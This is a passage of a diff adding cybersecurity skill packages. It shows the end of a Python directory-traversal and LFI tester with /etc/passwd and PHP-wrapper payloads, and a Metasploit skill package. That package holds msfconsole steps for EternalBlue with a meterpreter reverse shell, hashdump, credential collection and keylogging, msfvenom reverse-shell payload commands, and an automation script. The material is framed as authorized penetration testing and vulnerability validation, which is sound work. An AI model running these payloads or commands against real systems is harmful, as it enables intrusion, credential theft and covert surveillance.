@@ -1,0 +1,1313 @@
+[PART 9/14]
+-----
+        "../../../etc/passwd%00.jpg",
+        "../../../etc/passwd%00.html",
+        "../../../etc/passwd\x00",
+    ]
+
+    results = []
+    parsed = urlparse(url)
+    original_params = parse_qs(parsed.query)
+
+    for payload in null_payloads:
+        test_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
+        test_params[param] = payload
+
+        test_url = urlunparse((
+            parsed.scheme, parsed.netloc, parsed.path,
+            parsed.params, urlencode(test_params), parsed.fragment,
+        ))
+
+        try:
+            resp = session.get(test_url, timeout=10)
+            if any(ind in resp.text for ind in LINUX_INDICATORS):
+                results.append({
+                    "url": test_url,
+                    "payload": payload,
+                    "bypass_type": "null_byte",
+                    "vulnerable": True,
+                    "severity": "CRITICAL",
+                })
+        except requests.RequestException:
+            continue
+
+    return results
+
+
+def test_wrapper_protocols(url: str, param: str, session: requests.Session = None) -> list[dict]:
+    """Test PHP wrapper protocols for LFI exploitation."""
+    if session is None:
+        session = requests.Session()
+
+    wrappers = [
+        ("php://filter/convert.base64-encode/resource=index", "PHP filter wrapper"),
+        ("php://input", "PHP input wrapper"),
+        ("expect://id", "PHP expect wrapper"),
+        ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "PHP data wrapper"),
+        ("file:///etc/passwd", "file:// wrapper"),
+    ]
+
+    results = []
+    parsed = urlparse(url)
+    original_params = parse_qs(parsed.query)
+
+    for wrapper, description in wrappers:
+        test_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
+        test_params[param] = wrapper
+
+        test_url = urlunparse((
+            parsed.scheme, parsed.netloc, parsed.path,
+            parsed.params, urlencode(test_params), parsed.fragment,
+        ))
+
+        try:
+            resp = session.get(test_url, timeout=10)
+            suspicious = (
+                resp.status_code == 200 and
+                len(resp.text) > 100 and
+                "404" not in resp.text.lower()[:200]
+            )
+            if suspicious:
+                results.append({
+                    "url": test_url,
+                    "wrapper": wrapper,
+                    "description": description,
+                    "status_code": resp.status_code,
+                    "response_length": len(resp.text),
+                    "severity": "CRITICAL",
+                })
+        except requests.RequestException:
+            continue
+
+    return results
+
+
+def generate_report(traversal: list, null_byte: list, wrappers: list) -> str:
+    """Generate directory traversal testing report."""
+    all_vulns = traversal + null_byte + wrappers
+    lines = [
+        "DIRECTORY TRAVERSAL TESTING REPORT — AUTHORIZED TESTING ONLY",
+        "=" * 65,
+        f"Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}",
+        f"Total Vulnerabilities Found: {len(all_vulns)}",
+        "",
+        f"TRAVERSAL FINDINGS ({len(traversal)}):",
+        "-" * 40,
+    ]
+
+    for v in traversal:
+        lines.append(f"  [{v['severity']}] {v['parameter']}: {v['payload']}")
+        lines.append(f"    Evidence: {v['evidence']}")
+
+    if null_byte:
+        lines.extend([f"\nNULL BYTE BYPASS ({len(null_byte)}):"])
+        for n in null_byte:
+            lines.append(f"  [{n['severity']}] {n['payload']}")
+
+    if wrappers:
+        lines.extend([f"\nWRAPPER PROTOCOL ({len(wrappers)}):"])
+        for w in wrappers:
+            lines.append(f"  [{w['severity']}] {w['wrapper']} - {w['description']}")
+
+    return "\n".join(lines)
+
+
+if __name__ == "__main__":
+    print("[!] DIRECTORY TRAVERSAL TESTING — AUTHORIZED TESTING ONLY\n")
+
+    if len(sys.argv) < 2:
+        print(f"Usage: {sys.argv[0]} <target_url_with_params> [param_name]")
+        print(f"  Example: {sys.argv[0]} 'http://target/view?file=report.pdf' file")
+        sys.exit(1)
+
+    target_url = sys.argv[1]
+    param_name = sys.argv[2] if len(sys.argv) > 2 else None
+
+    if not param_name:
+        file_params = identify_file_parameters(target_url)
+        if file_params:
+            param_name = file_params[0]
+            print(f"[*] Auto-detected file parameter: {param_name}")
+        else:
+            print("[!] No file parameter detected. Specify parameter name.")
+            sys.exit(1)
+
+    session = requests.Session()
+
+    print(f"[*] Testing parameter '{param_name}' for directory traversal...")
+    traversal_results = test_traversal(target_url, param_name, session)
+
+    print("[*] Testing null byte bypass...")
+    null_results = test_null_byte_bypass(target_url, param_name, session)
+
+    print("[*] Testing wrapper protocols...")
+    wrapper_results = test_wrapper_protocols(target_url, param_name, session)
+
+    report = generate_report(traversal_results, null_results, wrapper_results)
+    print(report)
+
+##### END FILE #####
+
+##### FILE: exploiting-vulnerabilities-with-metasploit-framework/SKILL.md #####
+---
+name: exploiting-vulnerabilities-with-metasploit-framework
+description: Uses the Metasploit Framework (msfconsole and its exploit, auxiliary,
+  and post-exploitation modules) to validate that identified CVEs and vulnerabilities
+  are actually exploitable, gather post-exploitation evidence, and confirm patch
+  remediation. Use when performing vulnerability management validation, penetration
+  testing, or post-patch verification and you need to prove real-world exploitability
+  rather than rely on a scanner score alone.
+domain: cybersecurity
+subdomain: vulnerability-management
+tags:
+- vulnerability-management
+- cve
+- metasploit
+- exploitation
+- penetration-testing
+- risk
+version: '1.0'
+author: mahipal
+license: Apache-2.0
+nist_csf:
+- ID.RA-01
+- ID.RA-02
+- ID.IM-02
+- ID.RA-06
+mitre_attack:
+- T1190
+- T1203
+- T1068
+---
+# Exploiting Vulnerabilities with Metasploit Framework
+
+## Overview
+The Metasploit Framework is the world's most widely used penetration testing platform, maintained by Rapid7. It contains over 2,300 exploits, 1,200 auxiliary modules, and 400 post-exploitation modules. Within vulnerability management, Metasploit serves as a validation tool to confirm that identified vulnerabilities are actually exploitable, enabling risk-based prioritization and demonstrating real-world impact to stakeholders.
+
+
+## When to Use
+
+- When performing authorized security testing that involves exploiting vulnerabilities with metasploit framework
+- When analyzing malware samples or attack artifacts in a controlled environment
+- When conducting red team exercises or penetration testing engagements
+- When building detection capabilities based on offensive technique understanding
+
+## Prerequisites
+- Metasploit Framework installed (Kali Linux or standalone)
+- PostgreSQL database for session/credential management
+- Written authorization and rules of engagement for testing
+- Isolated test environment or approved production testing window
+- Understanding of networking, protocols, and exploitation concepts
+
+## Core Concepts
+
+### Metasploit Architecture
+- **msfconsole**: Primary interactive command-line interface
+- **Exploits**: Modules that leverage vulnerabilities to gain access
+- **Payloads**: Code executed on the target after successful exploitation
+- **Auxiliary**: Scanning, fuzzing, and information gathering modules
+- **Post-Exploitation**: Modules for privilege escalation, persistence, pivoting
+- **Encoders**: Payload encoding to evade signature-based detection
+- **Nops**: No-operation generators for payload alignment
+
+### Exploitation Workflow in Vulnerability Management
+Unlike offensive red teaming, vulnerability management uses Metasploit to:
+1. **Validate** scanner findings (confirm exploitability)
+2. **Demonstrate** risk to business stakeholders
+3. **Prioritize** remediation based on proven exploitation paths
+4. **Verify** patches by confirming exploits no longer succeed
+
+## Workflow
+
+### Step 1: Initialize Metasploit Environment
+```bash
+# Start PostgreSQL and initialize database
+sudo systemctl start postgresql
+sudo msfdb init
+
+# Launch msfconsole
+msfconsole -q
+
+# Verify database connection
+msf6> db_status
+msf6> workspace -a vuln_validation_2025
+
+# Import vulnerability scan results
+msf6> db_import /path/to/nessus_scan.nessus
+msf6> hosts
+msf6> vulns
+```
+
+### Step 2: Validate Specific Vulnerabilities
+```bash
+# Example: Validate MS17-010 (EternalBlue) from scan findings
+msf6> search type:exploit name:ms17_010
+msf6> use exploit/windows/smb/ms17_010_eternalblue
+msf6> show options
+msf6> set RHOSTS 192.168.1.100
+msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6> set LHOST 192.168.1.50
+msf6> set LPORT 4444
+
+# Use check command first (non-exploitative validation)
+msf6> check
+# [+] 192.168.1.100:445 - Host is likely VULNERABLE to MS17-010!
+
+# Only exploit if check confirms vulnerability and authorized
+msf6> exploit
+
+# Example: Validate Apache Struts RCE (CVE-2017-5638)
+msf6> use exploit/multi/http/struts2_content_type_ognl
+msf6> set RHOSTS target.example.com
+msf6> set RPORT 8080
+msf6> set TARGETURI /showcase.action
+msf6> check
+
+# Example: Validate Log4Shell (CVE-2021-44228)
+msf6> use exploit/multi/http/log4shell_header_injection
+msf6> set RHOSTS target.example.com
+msf6> set HTTP_HEADER X-Api-Version
+msf6> check
+```
+
+### Step 3: Auxiliary Scanning for Validation
+```bash
+# SMB vulnerability scanning
+msf6> use auxiliary/scanner/smb/smb_ms17_010
+msf6> set RHOSTS 192.168.1.0/24
+msf6> set THREADS 10
+msf6> run
+
+# SSL/TLS vulnerability checks
+msf6> use auxiliary/scanner/ssl/openssl_heartbleed
+msf6> set RHOSTS target.example.com
+msf6> run
+
+# HTTP vulnerability validation
+msf6> use auxiliary/scanner/http/dir_listing
+msf6> set RHOSTS target.example.com
+msf6> run
+
+# Database authentication testing
+msf6> use auxiliary/scanner/mssql/mssql_login
+msf6> set RHOSTS db-server.corp.local
+msf6> set USERNAME sa
+msf6> set PASSWORD ""
+msf6> run
+```
+
+### Step 4: Post-Exploitation Impact Assessment
+```bash
+# After successful exploitation, demonstrate impact
+meterpreter> getuid
+meterpreter> sysinfo
+meterpreter> hashdump
+meterpreter> run post/multi/gather/env
+meterpreter> run post/windows/gather/enum_patches
+meterpreter> run post/windows/gather/credentials/credential_collector
+
+# Network pivoting demonstration
+meterpreter> run post/multi/manage/autoroute
+meterpreter> run auxiliary/server/socks_proxy
+
+# Screenshot for evidence
+meterpreter> screenshot
+meterpreter> keyscan_start
+```
+
+### Step 5: Document and Report Findings
+```bash
+# Export exploitation evidence
+msf6> vulns -o /tmp/validated_vulns.csv
+msf6> hosts -o /tmp/compromised_hosts.csv
+msf6> creds -o /tmp/captured_creds.csv
+msf6> loot -o /tmp/captured_loot.csv
+
+# Generate report from database
+msf6> db_export -f xml /tmp/msf_report.xml
+```
+
+### Step 6: Post-Patch Verification
+```bash
+# After remediation, verify exploit no longer works
+msf6> use exploit/windows/smb/ms17_010_eternalblue
+msf6> set RHOSTS 192.168.1.100
+msf6> check
+# [-] 192.168.1.100:445 - Host does NOT appear vulnerable.
+# Patch verified successfully
+```
+
+## Safety Controls
+1. **Always use `check` command** before `exploit` when available
+2. **Set AutoRunScript** for clean session management
+3. **Use EXITFUNC=thread** to prevent crashing target services
+4. **Limit payload capabilities** to minimum needed for validation
+5. **Document every action** for audit trail and evidence
+6. **Use workspace isolation** per engagement
+7. **Never run Metasploit against unauthorized targets**
+
+## Best Practices
+1. Start with vulnerability check modules before exploitation
+2. Use Metasploit to validate top-priority scanner findings only
+3. Coordinate with system owners for testing windows
+4. Maintain detailed logs of all exploitation attempts
+5. Clean up all artifacts and sessions after testing
+6. Use results to create compelling risk narratives for stakeholders
+7. Integrate Metasploit validation into vulnerability management workflow
+
+## Common Pitfalls
+- Exploiting without written authorization (legal liability)
+- Using exploitation on production systems without coordination
+- Not cleaning up Meterpreter sessions and artifacts
+- Confusing vulnerability validation with penetration testing scope
+- Using outdated Metasploit modules against patched systems
+- Failing to document exploitation evidence for remediation teams
+
+## Related Skills
+- performing-red-team-validated-vulnerability-testing
+- scanning-infrastructure-with-nessus
+- performing-network-vulnerability-assessment
+
+##### END FILE #####
+
+##### FILE: exploiting-vulnerabilities-with-metasploit-framework/LICENSE #####
+
+                                 Apache License
+                           Version 2.0, January 2004
+                        http://www.apache.org/licenses/
+
+   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION
+
+   1. Definitions.
+
+      "License" shall mean the terms and conditions for use, reproduction,
+      and distribution as defined by Sections 1 through 9 of this document.
+
+      "Licensor" shall mean the copyright owner or entity authorized by
+      the copyright owner that is granting the License.
+
+      "Legal Entity" shall mean the union of the acting entity and all
+      other entities that control, are controlled by, or are under common
+      control with that entity. For the purposes of this definition,
+      "control" means (i) the power, direct or indirect, to cause the
+      direction or management of such entity, whether by contract or
+      otherwise, or (ii) ownership of fifty percent (50%) or more of the
+      outstanding shares, or (iii) beneficial ownership of such entity.
+
+      "You" (or "Your") shall mean an individual or Legal Entity
+      exercising permissions granted by this License.
+
+      "Source" form shall mean the preferred form for making modifications,
+      including but not limited to software source code, documentation
+      source, and configuration files.
+
+      "Object" form shall mean any form resulting from mechanical
+      transformation or translation of a Source form, including but
+      not limited to compiled object code, generated documentation,
+      and conversions to other media types.
+
+      "Work" shall mean the work of authorship, whether in Source or
+      Object form, made available under the License, as indicated by a
+      copyright notice that is included in or attached to the work
+      (an example is provided in the Appendix below).
+
+      "Derivative Works" shall mean any work, whether in Source or Object
+      form, that is based on (or derived from) the Work and for which the
+      editorial revisions, annotations, elaborations, or other modifications
+      represent, as a whole, an original work of authorship. For the purposes
+      of this License, Derivative Works shall not include works that remain
+      separable from, or merely link (or bind by name) to the interfaces of,
+      the Work and Derivative Works thereof.
+
+      "Contribution" shall mean any work of authorship, including
+      the original version of the Work and any modifications or additions
+      to that Work or Derivative Works thereof, that is intentionally
+      submitted to the Licensor for inclusion in the Work by the copyright owner
+      or by an individual or Legal Entity authorized to submit on behalf of
+      the copyright owner. For the purposes of this definition, "submitted"
+      means any form of electronic, verbal, or written communication sent
+      to the Licensor or its representatives, including but not limited to
+      communication on electronic mailing lists, source code control systems,
+      and issue tracking systems that are managed by, or on behalf of, the
+      Licensor for the purpose of discussing and improving the Work, but
+      excluding communication that is conspicuously marked or otherwise
+      designated in writing by the copyright owner as "Not a Contribution."
+
+      "Contributor" shall mean Licensor and any individual or Legal Entity
+      on behalf of whom a Contribution has been received by the Licensor and
+      subsequently incorporated within the Work.
+
+   2. Grant of Copyright License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      copyright license to reproduce, prepare Derivative Works of,
+      publicly display, publicly perform, sublicense, and distribute the
+      Work and such Derivative Works in Source or Object form.
+
+   3. Grant of Patent License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      (except as stated in this section) patent license to make, have made,
+      use, offer to sell, sell, import, and otherwise transfer the Work,
+      where such license applies only to those patent claims licensable
+      by such Contributor that are necessarily infringed by their
+      Contribution(s) alone or by combination of their Contribution(s)
+      with the Work to which such Contribution(s) was submitted. If You
+      institute patent litigation against any entity (including a
+      cross-claim or counterclaim in a lawsuit) alleging that the Work
+      or a Contribution incorporated within the Work constitutes direct
+      or contributory patent infringement, then any patent licenses
+      granted to You under this License for that Work shall terminate
+      as of the date such litigation is filed.
+
+   4. Redistribution. You may reproduce and distribute copies of the
+      Work or Derivative Works thereof in any medium, with or without
+      modifications, and in Source or Object form, provided that You
+      meet the following conditions:
+
+      (a) You must give any other recipients of the Work or
+          Derivative Works a copy of this License; and
+
+      (b) You must cause any modified files to carry prominent notices
+          stating that You changed the files; and
+
+      (c) You must retain, in the Source form of any Derivative Works
+          that You distribute, all copyright, patent, trademark, and
+          attribution notices from the Source form of the Work,
+          excluding those notices that do not pertain to any part of
+          the Derivative Works; and
+
+      (d) If the Work includes a "NOTICE" text file as part of its
+          distribution, then any Derivative Works that You distribute must
+          include a readable copy of the attribution notices contained
+          within such NOTICE file, excluding any notices that do not
+          pertain to any part of the Derivative Works, in at least one
+          of the following places: within a NOTICE text file distributed
+          as part of the Derivative Works; within the Source form or
+          documentation, if provided along with the Derivative Works; or,
+          within a display generated by the Derivative Works, if and
+          wherever such third-party notices normally appear. The contents
+          of the NOTICE file are for informational purposes only and
+          do not modify the License. You may add Your own attribution
+          notices within Derivative Works that You distribute, alongside
+          or as an addendum to the NOTICE text from the Work, provided
+          that such additional attribution notices cannot be construed
+          as modifying the License.
+
+      You may add Your own copyright statement to Your modifications and
+      may provide additional or different license terms and conditions
+      for use, reproduction, or distribution of Your modifications, or
+      for any such Derivative Works as a whole, provided Your use,
+      reproduction, and distribution of the Work otherwise complies with
+      the conditions stated in this License.
+
+   5. Submission of Contributions. Unless You explicitly state otherwise,
+      any Contribution intentionally submitted for inclusion in the Work
+      by You to the Licensor shall be under the terms and conditions of
+      this License, without any additional terms or conditions.
+      Notwithstanding the above, nothing herein shall supersede or modify
+      the terms of any separate license agreement you may have executed
+      with Licensor regarding such Contributions.
+
+   6. Trademarks. This License does not grant permission to use the trade
+      names, trademarks, service marks, or product names of the Licensor,
+      except as required for reasonable and customary use in describing the
+      origin of the Work and reproducing the content of the NOTICE file.
+
+   7. Disclaimer of Warranty. Unless required by applicable law or
+      agreed to in writing, Licensor provides the Work (and each
+      Contributor provides its Contributions) on an "AS IS" BASIS,
+      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
+      implied, including, without limitation, any warranties or conditions
+      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
+      PARTICULAR PURPOSE. You are solely responsible for determining the
+      appropriateness of using or redistributing the Work and assume any
+      risks associated with Your exercise of permissions under this License.
+
+   8. Limitation of Liability. In no event and under no legal theory,
+      whether in tort (including negligence), contract, or otherwise,
+      unless required by applicable law (such as deliberate and grossly
+      negligent acts) or agreed to in writing, shall any Contributor be
+      liable to You for damages, including any direct, indirect, special,
+      incidental, or consequential damages of any character arising as a
+      result of this License or out of the use or inability to use the
+      Work (including but not limited to damages for loss of goodwill,
+      work stoppage, computer failure or malfunction, or any and all
+      other commercial damages or losses), even if such Contributor
+      has been advised of the possibility of such damages.
+
+   9. Accepting Warranty or Additional Liability. While redistributing
+      the Work or Derivative Works thereof, You may choose to offer,
+      and charge a fee for, acceptance of support, warranty, indemnity,
+      or other liability obligations and/or rights consistent with this
+      License. However, in accepting such obligations, You may act only
+      on Your own behalf and on Your sole responsibility, not on behalf
+      of any other Contributor, and only if You agree to indemnify,
+      defend, and hold each Contributor harmless for any liability
+      incurred by, or claims asserted against, such Contributor by reason
+      of your accepting any such warranty or additional liability.
+
+   END OF TERMS AND CONDITIONS
+
+   APPENDIX: How to apply the Apache License to your work.
+
+      To apply the Apache License to your work, attach the following
+      boilerplate notice, with the fields enclosed by brackets "[]"
+      replaced with your own identifying information. (Don't include
+      the brackets!)  The text should be enclosed in the appropriate
+      comment syntax for the file format. Please do not remove or change
+      the license header comment from a contributed file except when
+      necessary.
+
+   Copyright 2026 mukul975
+
+   Licensed under the Apache License, Version 2.0 (the "License");
+   you may not use this file except in compliance with the License.
+   You may obtain a copy of the License at
+
+       http://www.apache.org/licenses/LICENSE-2.0
+
+   Unless required by applicable law or agreed to in writing, software
+   distributed under the License is distributed on an "AS IS" BASIS,
+   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+   See the License for the specific language governing permissions and
+   limitations under the License.
+
+##### END FILE #####
+
+##### FILE: exploiting-vulnerabilities-with-metasploit-framework/assets/template.md #####
+# Metasploit Vulnerability Validation Report Template
+
+## Engagement Details
+| Field | Value |
+|-------|-------|
+| Engagement Type | Vulnerability Validation |
+| Authorization | [Document Reference] |
+| Testing Window | [Start] to [End] |
+| Tester | [Name] |
+| Tool | Metasploit Framework [version] |
+
+## Validation Summary
+| Metric | Count |
+|--------|-------|
+| CVEs Tested | [N] |
+| Confirmed Exploitable | [N] |
+| Not Exploitable | [N] |
+| Inconclusive | [N] |
+| No Module Available | [N] |
+
+## Confirmed Exploitable Vulnerabilities
+### [CVE-ID] - [Vulnerability Name]
+- **Module**: [exploit/category/module_name]
+- **Target**: [IP:Port]
+- **Impact**: [RCE/Auth Bypass/Info Disclosure]
+- **Exploitation Evidence**: [Screenshot/Output reference]
+- **Business Risk**: [Description of real-world impact]
+- **Remediation**: [Specific patch or mitigation]
+
+## Post-Validation Recommendations
+1. [Prioritized remediation actions based on confirmed exploitation]
+2. [Network segmentation recommendations]
+3. [Detection rule recommendations for confirmed attack paths]
+
+##### END FILE #####
+
+##### FILE: exploiting-vulnerabilities-with-metasploit-framework/references/api-reference.md #####
+# API Reference: Metasploit Framework
+
+## msfconsole Commands
+
+### Module Search
+```
+search type:exploit platform:windows cve:2021
+search name:eternalblue
+```
+
+### Module Usage
+```
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.10.10.1
+set LHOST 10.10.10.5
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+check
+exploit
+```
+
+### Resource Scripts
+```bash
+msfconsole -q -r exploit.rc
+```
+
+## Module Types
+
+| Type | Path | Purpose |
+|------|------|---------|
+| exploit | exploit/ | Deliver payloads |
+| auxiliary | auxiliary/ | Scanning, fuzzing |
+| post | post/ | Post-exploitation |
+| payload | payload/ | Shellcode/agents |
+| encoder | encoder/ | Evasion encoding |
+
+## Common Exploit Modules
+
+| CVE | Module | Target |
+|-----|--------|--------|
+| CVE-2017-0144 | exploit/windows/smb/ms17_010_eternalblue | SMBv1 |
+| CVE-2019-0708 | exploit/windows/rdp/cve_2019_0708_bluekeep_rce | RDP |
+| CVE-2021-44228 | exploit/multi/http/log4shell_header_injection | Log4j |
+| CVE-2020-1472 | exploit/windows/dcerpc/zerologon | Netlogon |
+| CVE-2021-34527 | exploit/windows/dcerpc/cve_2021_1675_printnightmare | Print Spooler |
+
+## Meterpreter Commands
+
+### System
+```
+sysinfo          # System information
+getuid           # Current user
+getsystem        # Privilege escalation
+hashdump         # Dump password hashes
+```
+
+### File System
+```
+upload /local/file /remote/path
+download /remote/file /local/path
+```
+
+### Network
+```
+portfwd add -l 8080 -p 80 -r 10.10.10.2
+route add 10.10.20.0 255.255.255.0 1
+```
+
+## Metasploit REST API
+
+### Authentication
+```http
+POST https://msf:3790/api/v1/auth/account
+Content-Type: application/json
+
+{"username": "msf", "password": "password"}
+```
+
+### List Modules
+```http
+GET https://msf:3790/api/v1/modules/exploits
+Authorization: Token {token}
+```
+
+### Run Module
+```http
+POST https://msf:3790/api/v1/modules/execute
+Authorization: Token {token}
+
+{
+  "module_type": "exploit",
+  "module_name": "exploit/windows/smb/ms17_010_eternalblue",
+  "datastore": {"RHOSTS": "10.10.10.1"}
+}
+```
+
+## msfvenom — Payload Generation
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o shell.exe
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf
+```
+
+##### END FILE #####
+
+##### FILE: exploiting-vulnerabilities-with-metasploit-framework/references/standards.md #####
+# Standards and References - Metasploit Framework
+
+## Industry Standards
+- **PTES (Penetration Testing Execution Standard)**: http://www.pentest-standard.org/
+- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
+- **NIST SP 800-115**: Technical Guide to Information Security Testing and Assessment
+- **OSSTMM v3**: Open Source Security Testing Methodology Manual
+
+## Metasploit Documentation
+- Metasploit Framework Docs: https://docs.rapid7.com/metasploit/
+- Metasploit Unleashed (OffSec): https://www.offsec.com/metasploit-unleashed/
+- Metasploit GitHub: https://github.com/rapid7/metasploit-framework
+- Module Development Guide: https://docs.metasploit.com/docs/development/developing-modules.html
+
+## Key msfconsole Commands Reference
+| Command | Purpose |
+|---------|---------|
+| `search` | Search modules by name, CVE, platform |
+| `use` | Select a module |
+| `show options` | Display module configuration |
+| `set/setg` | Set module/global variables |
+| `check` | Verify vulnerability without exploitation |
+| `exploit/run` | Execute the module |
+| `sessions` | List active sessions |
+| `db_import` | Import scan results (Nessus, Nmap, etc.) |
+| `vulns` | List known vulnerabilities from database |
+| `workspace` | Manage engagement workspaces |
+
+## Legal Considerations
+- Always obtain written authorization before testing
+- Define scope, rules of engagement, and emergency contacts
+- Document all activities for legal protection
+- Follow responsible disclosure for any new findings
+- Comply with local computer misuse laws
+
+##### END FILE #####
+
+##### FILE: exploiting-vulnerabilities-with-metasploit-framework/references/workflows.md #####
+# Workflows - Metasploit Vulnerability Exploitation
+
+## Workflow 1: Vulnerability Validation Pipeline
+
+```
+┌───────────────┐   ┌───────────────┐   ┌───────────────┐
+│ Import Scan   │──>│ Filter Top    │──>│ Search MSF    │
+│ Results to DB │   │ Priority CVEs │   │ Modules       │
+└───────────────┘   └───────────────┘   └───────────────┘
+                                              │
+       ┌─────────────────────────────────────┘
+       v
+┌───────────────┐   ┌───────────────┐   ┌───────────────┐
+│ Run `check`   │──>│ Exploit if    │──>│ Document      │
+│ Command       │   │ Authorized    │   │ Evidence      │
+└───────────────┘   └───────────────┘   └───────────────┘
+       │
+       v
+┌───────────────┐   ┌───────────────┐
+│ Update Risk   │──>│ Prioritize    │
+│ Assessment    │   │ Remediation   │
+└───────────────┘   └───────────────┘
+```
+
+## Workflow 2: Patch Verification
+
+```
+Patch Deployed
+    │
+    ├──> Re-run `check` command against patched host
+    │        │
+    │        ├──> NOT VULNERABLE → Patch verified ✓
+    │        └──> STILL VULNERABLE → Patch failed ✗
+    │                 │
+    │                 └──> Escalate to remediation team
+    │
+    └──> Re-run auxiliary scanner
+             │
+             ├──> No findings → Remediation confirmed
+             └──> Findings persist → Incomplete patch
+```
+
+## Workflow 3: Metasploit Module Selection
+
+```
+CVE Identified
+    │
+    ├──> search cve:CVE-YYYY-NNNNN
+    │        │
+    │        ├──> Exploit module found → Use for validation
+    │        ├──> Auxiliary scanner found → Use for bulk check
+    │        └──> No module found → Manual validation required
+    │
+    └──> Alternative: search for related modules
+             │
+             ├──> search type:exploit platform:windows target:smb
+             └──> search type:auxiliary name:scanner
+```
+
+##### END FILE #####
+
+##### FILE: exploiting-vulnerabilities-with-metasploit-framework/scripts/agent.py #####
+#!/usr/bin/env python3
+"""Agent for vulnerability exploitation workflow using Metasploit Framework — authorized testing."""
+
+import argparse
+import json
+import subprocess
+from datetime import datetime, timezone
+
+
+def search_modules(search_term):
+    """Search Metasploit modules via msfconsole."""
+    rc_content = f"search {search_term}\nexit\n"
+    rc_file = "/tmp/msf_search.rc"
+    with open(rc_file, "w") as f:
+        f.write(rc_content)
+    try:
+        result = subprocess.check_output(
+            ["msfconsole", "-q", "-r", rc_file],
+            text=True, errors="replace", timeout=60
+        )
+        modules = []
+        for line in result.splitlines():
+            if "exploit/" in line or "auxiliary/" in line:
+                parts = line.split()
+                if len(parts) >= 3:
+                    modules.append({
+                        "type": parts[0],
+                        "module": parts[1],
+                        "rank": parts[2] if len(parts) > 2 else "",
+                    })
+        return modules
+    except (subprocess.SubprocessError, FileNotFoundError):
+        return [{"error": "msfconsole not available"}]
+
+
+def generate_rc_file(module, options, output_file):
+    """Generate a Metasploit resource script for automated execution."""
+    lines = [f"use {module}"]
+    for key, value in options.items():
+        lines.append(f"set {key} {value}")
+    lines.append("check")
+    lines.append("exit")
+    rc_content = "\n".join(lines) + "\n"
+    with open(output_file, "w") as f:
+        f.write(rc_content)
+    return {"rc_file": output_file, "module": module, "options": options}
+
+
+def run_nmap_vuln_scan(target):
+    """Run nmap vulnerability scan to identify exploitable services."""
+    try:
+        result = subprocess.check_output(
+            ["nmap", "-sV", "--script", "vuln", "-p-", "--min-rate", "1000", target],
+            text=True, errors="replace", timeout=300
+        )
+        vulns = []
+        current_port = ""
+        for line in result.splitlines():
+            if "/tcp" in line or "/udp" in line:
+                current_port = line.split("/")[0].strip()
+            if "VULNERABLE" in line or "CVE-" in line:
+                vulns.append({"port": current_port, "finding": line.strip()})
+        return {"target": target, "vulnerabilities": vulns}
+    except (subprocess.SubprocessError, FileNotFoundError):
+        return {"target": target, "error": "nmap not available"}
+
+
+def map_cve_to_module(cve):
+    """Map a CVE to known Metasploit modules."""
+    cve_module_map = {
+        "CVE-2017-0144": "exploit/windows/smb/ms17_010_eternalblue",
+        "CVE-2019-0708": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+        "CVE-2021-44228": "exploit/multi/http/log4shell_header_injection",
+        "CVE-2021-34527": "exploit/windows/dcerpc/cve_2021_1675_printnightmare",
+        "CVE-2020-1472": "exploit/windows/dcerpc/zerologon",
+        "CVE-2021-26855": "exploit/windows/http/exchange_proxylogon_rce",
+    }
+    return cve_module_map.get(cve, None)
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Metasploit Framework exploitation workflow (authorized testing only)"
+    )
+    parser.add_argument("--search", help="Search for Metasploit modules")
+    parser.add_argument("--scan", help="Target IP for nmap vuln scan")
+    parser.add_argument("--generate-rc", help="Module to generate RC file for")
+    parser.add_argument("--rhost", help="Target host for RC file")
+    parser.add_argument("--lhost", help="Local host for reverse shell")
+    parser.add_argument("--cve", help="Map CVE to Metasploit module")
+    parser.add_argument("--output", "-o", help="Output JSON report")
+    args = parser.parse_args()
+
+    print("[*] Metasploit Framework Automation Agent")
+    print("[!] For authorized security testing only")
+    report = {"timestamp": datetime.now(timezone.utc).isoformat(), "findings": {}}
+
+    if args.search:
+        modules = search_modules(args.search)
+        report["findings"]["search_results"] = modules
+        print(f"[*] Found {len(modules)} modules for '{args.search}'")
+
+    if args.scan:
+        scan_result = run_nmap_vuln_scan(args.scan)
+        report["findings"]["vuln_scan"] = scan_result
+
+    if args.generate_rc:
+        options = {}
+        if args.rhost:
+            options["RHOSTS"] = args.rhost
+        if args.lhost:
+            options["LHOST"] = args.lhost
+        rc = generate_rc_file(args.generate_rc, options, "/tmp/exploit.rc")
+        report["findings"]["rc_file"] = rc
+        print(f"[*] RC file generated: {rc['rc_file']}")
+
+    if args.cve:
+        module = map_cve_to_module(args.cve)
+        report["findings"]["cve_mapping"] = {"cve": args.cve, "module": module}
+        print(f"[*] {args.cve} -> {module or 'no known module'}")
+
+    if args.output:
+        with open(args.output, "w") as f:
+            json.dump(report, f, indent=2)
+        print(f"[*] Report saved to {args.output}")
+    else:
+        print(json.dumps(report, indent=2))
+
+
+if __name__ == "__main__":
+    main()
+
+##### END FILE #####
+
+##### FILE: exploiting-vulnerabilities-with-metasploit-framework/scripts/process.py #####
+#!/usr/bin/env python3
+"""
+Metasploit Vulnerability Validation Automation
+
+Uses Metasploit RPC API (msfrpcd) to automate vulnerability validation
+by running check commands against scan findings.
+
+Requirements:
+    pip install requests pandas pymetasploit3
+
+Usage:
